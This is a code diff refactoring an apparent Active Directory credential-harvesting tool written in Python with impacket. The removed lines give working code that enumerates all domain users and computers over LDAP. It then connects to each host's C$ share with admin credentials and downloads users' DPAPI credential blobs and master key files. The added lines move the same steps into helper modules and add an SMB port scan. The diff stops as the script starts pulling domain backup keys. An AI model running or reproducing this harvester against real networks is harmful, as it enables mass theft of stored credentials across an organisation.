@@ -19,7 +19,7 @@
 #	kalu (@kalu_69)
 
 import os, sys, argparse, random, string, time
-from ldap3 import Connection, Server, NTLM, ALL
+# from ldap3 import Connection, Server, NTLM, ALL
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
 from impacket.smb3structs import SMB2_DIALECT_002
@@ -37,10 +37,11 @@ from Cryptodome.Cipher import PKCS1_v1_5
 from datetime import datetime
 from impacket.ese import getUnixTime
 import hashlib
+from ad_ldap import Connect_AD_ldap, Get_AD_users, Get_AD_computers, SmbScan, Get_online_computers
+from blobs import Create_folders, Get_blob_and_mkf
+
 
 sys.tracebacklimit = 0
-
-
 
 
 def main():
@@ -74,7 +75,6 @@ def main():
 		parser.print_help()
 		sys.exit(1)
 
-
 	options                             = parser.parse_args()
 	domain, username, password, address = parse_target(options.target)
 	passLdap 							= password
@@ -104,6 +104,10 @@ def main():
 	else:
 		preferredDialect = None
 
+	debug = options.debug
+	debugmax = options.debugmax
+	port = int(options.port)
+
 	myNameCharList = string.ascii_lowercase
 	myNameLen      = random.randrange(6,12)
 	myName         = ''.join((random.choice(myNameCharList) for i in range(myNameLen)))
@@ -112,7 +116,7 @@ def main():
 	try:
 		if options.debug is True or options.debugmax is True:
 			print("Testing admin rights...")
-		smbClient = SMBConnection(address, address, myName=myName, sess_port=int(options.port), preferredDialect=preferredDialect)
+		smbClient = SMBConnection(address, address, myName=myName, sess_port=port, preferredDialect=preferredDialect)
 		smbClient.login(username, password, domain, lmhash, nthash)
 		if smbClient.connectTree("c$") != 1:
 			raise
@@ -125,230 +129,35 @@ def main():
 			traceback.print_exc()
 		sys.exit(1)
 
-
 	# try to connect to ldap
-
-	if options.debug is True or options.debugmax is True:
-		print("Testing LDAP connection...")
-
-	connectionFailed = False
-	serv 			 = Server(address, get_info=ALL, use_ssl=True, connect_timeout=15)
-	ldapConnection   = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)
-
-	try:
-		if not ldapConnection.bind():
-			print("Error : Could not connect to ldap : bad credentials")
-			sys.exit(1)
-		if options.debug is True or options.debugmax is True:
-			print("LDAP connection successfull with SSL encryption.")
-	except:
-		print("Error : Could not connect to ldap with SSL encryption. Trying without SSL encryption...")
-		connectionFailed = True
-
-	if True == connectionFailed:
-		try:
-			serv = Server(address, get_info=ALL, connect_timeout=15)
-			ldapConnection = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)
-			if not ldapConnection.bind():
-				print("Error : Could not connect to ldap : bad credentials")
-				sys.exit(1)
-			if options.debug is True or options.debugmax is True:
-				print("LDAP connection successfull without encryption.")
-		except:
-			print("Error : Could not connect to ldap.")
-			if options.debug is True or options.debugmax is True:
-				import traceback
-				traceback.print_exc()
-			sys.exit(1)
-
-	# Create the baseDN
-	baseDN = serv.info.other['defaultNamingContext'][0]
+	ldapConnection,baseDN = Connect_AD_ldap(address, domain, username, passLdap, debug, debugmax)
 
 	# catch all users in domain or just the specified one
-	if options.just_user is not None :
-		searchFilter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName="+str( options.just_user)+"))"
-		print("Target user will be only " + str( options.just_user))
-	else:
-		searchFilter = "(&(objectCategory=person)(objectClass=user))"
-	try:
-		if options.debug is True or options.debugmax is True:
-			print("Retrieving user objects in LDAP directory...")
-		users_list = []
-		ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['sAMAccountName', 'objectSID'])
-		ldap_users = ldapConnection.entries
-		if options.debug is True or options.debugmax is True:
-			print("Converting ObjectSID in string SID...")
-		
-		for user in ldap_users:
-			try:
-				ldap_username = str(user['sAMAccountName'])
-				sid           = str(user['objectSID'])
-				name_and_sid  = [ldap_username.strip(), sid]
-				users_list.append(name_and_sid)
-			except:
-				pass 
-				# some users may not have samAccountName
-		if options.debug is True or options.debugmax is True:
-			print("Found about " + str( len(users_list) ) + " users in LDAP directory.")
-	except:
-		print("Error : Could not extract users from ldap.")
-		if options.debug is True or options.debugmax is True:
-			import traceback
-			traceback.print_exc()
-		sys.exit(1)
-	if len(users_list) == 0:
-		print("No user found in LDAP directory")
-		sys.exit(1);
-
-
+	users_list = Get_AD_users(ldapConnection, baseDN, options.just_user, debug, debugmax)
+	
 	# catch all computers in domain or just the specified one
-	if options.just_computer is not None :
-		computers_list = []
-		computers_list.append( options.just_computer )
-		print("Target computer will be only " + str( options.just_computer))
-	else:
-		try:
-			if options.debug is True or options.debugmax is True:
-				print("Retrieving computer objects in LDAP directory...")
-			searchFilter   = "(&(objectCategory=computer)(objectClass=computer))"
-			computers_list = []
-			ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['cn'])
-			ldap_computers = ldapConnection.entries
-			for computer in ldap_computers:
-				try:
-					comp_name = str(computer['cn'])
-					computers_list.append(comp_name.strip())
-				except:
-					pass
-			if options.debug is True or options.debugmax is True:
-				print("Found about " + str( len(computers_list) ) + " computers in LDAP directory.")
-		except:
-			print("Error : Could not extract computers from ldap.")
-			if options.debug is True or options.debugmax is True:
-				import traceback
-				traceback.print_exc()
+	computers_list = Get_AD_computers(ldapConnection, baseDN, options.just_computer, debug, debugmax)
 
-	# creating folders to store blob and mkf
-	if options.debug is True or options.debugmax is True:
-		print("Creating structure folders to store blob and mkf...")
-	if domain == '':
-		directory = 'Results'
-	else:
-		directory = domain
-	blobFolder = domain + "/blob"
-	mkfFolder  = domain + "/mfk"
-	if not os.path.exists(directory):
-	    os.mkdir(directory)
-	if not os.path.exists(blobFolder):
-	    os.mkdir(blobFolder)
-	if not os.path.exists(mkfFolder):
-		os.mkdir(mkfFolder)
+	# # creating folders to store blobs and master key files
+	blobFolder, mkfFolder, directory = Create_folders(domain, debug, debugmax)
+
+	# Scanning computers list on SMB port
+	if debug is True or debugmax is True:
+		print("[+] Scanning computers list on SMB port ...")
+	SmbScan(computers_list, domain, dns_server, port, debug, debugmax)
+
+	online_computers = Get_online_computers()
+	if debug is True or debugmax is True:
+		print("It seems that " + str(len(online_computers)) + " computers are online ...")
+
+	# # Retrieving blobs and mkf files
+	Get_blob_and_mkf(online_computers, users_list, username, password, domain, lmhash, nthash, myName, port, preferredDialect, blobFolder, mkfFolder, dns_server, debug, debugmax)
 
 
-
-	if options.debug is True or options.debugmax is True:
-		print("Connnecting to all computers to test user creds existence...")
-	for current_computer in computers_list:
-		# connect to all computers and extract all users blobs and mkf
-		try:
-			# resolve dns to ip address
-			resolver             = dns.resolver.Resolver(configure=False)
-			resolver.nameservers = [dns_server]
-			current_computer     = current_computer + "." + domain
-			# trying dns resolution in TCP and if it fails, we try in UDP
-			answer = resolver.resolve(current_computer, "A", tcp=True)
-			if len(answer) == 0:
-				answer = resolver.resolve(current_computer, "A", tcp=False)
-				if len(answer) == 0:
-					print("DNS resolution for "+str(current_computer) + " has failed.")
-					sys.exit(1)
-			else:
-				answer = str(answer[0])
-			smbClient  = SMBConnection(answer, answer, myName=myName, sess_port=int(options.port), timeout=10, preferredDialect=preferredDialect)
-			smbClient.login(username, password, domain, lmhash, nthash)
-			tid = smbClient.connectTree('c$')
-			if tid != 1:
-				sys.exit(1)
-			# Instead of testing all users folder, just get content and compare folder names to usernames array to find existing folders faster (thanks to @kal-u for the idea)
-			existing_users_folder = smbClient.listPath("C$", "\\users\\*")
-			
-			for current_user_folder in existing_users_folder:
-				current_user_folder = str( str(current_user_folder).split("longname=\"")[1] ).split("\", filesize=")[0].lower()
-				for current_user in users_list:
-					if current_user_folder != "." and current_user_folder != ".." :
-						if str(current_user[0]).lower() == str(current_user_folder).lower():
-							try:
-								if options.debug is True:
-									print("Find existing user " + str(current_user[0]) + " on computer " + str(current_computer) )
-								response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
-								is_there_any_blob_for_this_user = False
-								count_blobs = 0
-								count_mkf   = 0
-								for blob_file in response:
-									blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-									if blob_file != "." and blob_file != "..":
-										# create and retrieve the credential blob
-										count_blobs     = count_blobs + 1
-										computer_folder = blobFolder + "/" + str(current_computer)
-										if not os.path.exists(computer_folder):
-											os.mkdir(computer_folder)
-										user_folder = computer_folder + "/" + str(current_user[0])
-										if not os.path.exists(user_folder):
-											os.mkdir(user_folder)
-										wf = open(user_folder + "/" + blob_file,'wb')
-										smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
-										is_there_any_blob_for_this_user = True
-								response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
-
-								for blob_file in response:
-									blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-									if blob_file != "." and blob_file != "..":
-										# create and retrieve the credential blob
-										count_blobs     = count_blobs + 1
-										computer_folder = blobFolder + "/" + str(current_computer)
-										if not os.path.exists(computer_folder):
-											os.mkdir(computer_folder)
-										user_folder = computer_folder + "/" + str(current_user[0])
-										if not os.path.exists(user_folder):
-											os.mkdir(user_folder)
-										wf = open(user_folder + "/" + blob_file,'wb')
-										smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
-										is_there_any_blob_for_this_user = True
-								if is_there_any_blob_for_this_user is True:
-									# If there is cred blob there is mkf so we have to get them too
-									response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
-									for mkf in response:
-										mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
-										if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
-											count_mkf = count_mkf + 1
-											wf        = open(mkfFolder + "/" + mkf,'wb')
-											smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
-									print("New credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
-									print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
-							except KeyboardInterrupt:
-								os._exit(1)
-							except:
-								pass # this user folder do not exist on this computer
-		except KeyboardInterrupt:
-			os._exit(1)
-		except dns.exception.DNSException:
-			if options.debugmax is True:
-				print("Error on computer "+str(current_computer))
-				import traceback
-				traceback.print_exc()
-			pass
-		except:
-			if options.debug is True:
-				print("Debug : Could not connect to computer : " + str(current_computer))
-			if options.debugmax is True:
-				import traceback
-				traceback.print_exc()
-			pass # this computer is probably turned off for the moment
 	
 
-
 	if options.pvk is None:
-		if options.debug is True:
+		if debug is True:
 			print("Domain backup keys not given.\nTrying to extract...")
 		# get domain backup keys
 		try:
